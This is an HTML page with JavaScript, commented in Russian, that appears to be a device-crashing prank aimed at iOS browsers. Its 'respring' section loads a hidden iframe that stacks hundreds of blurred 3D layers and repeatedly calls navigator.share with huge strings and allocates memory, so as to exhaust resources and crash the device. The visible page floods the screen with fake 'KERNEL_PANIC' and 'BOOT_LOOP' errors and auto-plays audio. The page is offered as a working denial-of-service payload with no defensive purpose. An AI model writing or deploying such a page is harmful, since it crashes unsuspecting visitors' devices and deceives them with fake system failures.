<style>
body {
    background:#8b0000;
    margin:0;
    overflow:hidden;
    font-family:monospace;
}

/* ===== ВАЖНО: фиксируем текст поверх ВСЕГО ===== */
.error-msg {
    font-size: 6px;
    opacity: 0.7;
    color: white;
    position: fixed;   /* ← ключевой фикс */
    z-index: 999999;   /* ← поверх iframe */
    pointer-events: none;
    white-space: nowrap;
}

/* iframe не мешает */
#respring-iframe {
    position: fixed;
    width: 1px;
    height: 1px;
    opacity: 0.01;
    pointer-events: none;
    z-index: 0;
}
</style>
</head>

<body>

<iframe id="respring-iframe"
sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

<script>

/* ================= AUDIO (НЕ ТРОГАЕМ) ================= */

const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";

let ctx, buffer, played=false;

async function initAudio(){
    if(!ctx) ctx = new (window.AudioContext||window.webkitAudioContext)();

    if(!buffer){
        const r = await fetch(audioUrl);
        const a = await r.arrayBuffer();
        buffer = await ctx.decodeAudioData(a);
    }
}

function play(){
    if(!buffer || played) return;

    const s = ctx.createBufferSource();
    const g = ctx.createGain();

    const t = ctx.currentTime;
    g.gain.setValueAtTime(0.0001, t);
    g.gain.exponentialRampToValueAtTime(1, t+0.01);

    s.buffer = buffer;
    s.connect(g).connect(ctx.destination);
    s.start();

    played = true;
}

async function startAudio(){
    try{
        await initAudio();
        if(ctx.state==="suspended") await ctx.resume();
        play();
    }catch(e){}
}

window.addEventListener("load", ()=> startAudio());

document.addEventListener("click", startAudio, {once:true});
document.addEventListener("touchstart", startAudio, {once:true});
document.addEventListener("pointerdown", startAudio, {once:true});


/* ================= RESPRING ================= */

window.onload = function() {
    setTimeout(() => {
        const frame = document.getElementById('respring-iframe');

        const respringScript = `
            <html>
            <body style="margin:0;overflow:hidden;">
            <script>
                const c = document.createElement('div');
                c.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%';
                document.body.appendChild(c);

                for(let i=0;i<500;i++){
                    let d=document.createElement('div');
                    d.style.cssText =
                        'position:absolute;width:100vw;height:100vh;' +
                        'backdrop-filter:blur(40px);' +
                        'transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);' +
                        'opacity:0.99;';
                    c.appendChild(d);
                }

                setInterval(()=>{
                    try{ navigator.share({title:'R',text:'R'.repeat(50000)}); }catch(e){}
                    crypto.getRandomValues(new Uint8Array(1024*512));
                },200);
            <\/script>
            </body>
            </html>
        `;

        frame.srcdoc = respringScript;

    }, 2000);
};


/* ================= ТЕКСТ (ГЛАВНЫЙ ФИКС) ================= */

const errors = [
"Fatal Error","KERNEL_PANIC","BOOT_LOOP",
"SYSTEM FAILURE","STACK OVERFLOW"
];

function spawnText(){
    for(let i=0;i<300;i++){ // ↓ было 3000 → это ломало WebView
        const s=document.createElement("span");
        s.className="error-msg";
        s.innerText=errors[Math.floor(Math.random()*errors.length)];

        // рандом позиция, чтобы ВСЕГДА было видно
        s.style.top=Math.random()*100+"vh";
        s.style.left=Math.random()*100+"vw";

        document.body.appendChild(s);
    }
}

/* ВАЖНО: ждём стабильный рендер */
window.addEventListener("load", ()=>{
    setTimeout(spawnText, 50);
});

</script>

</body>
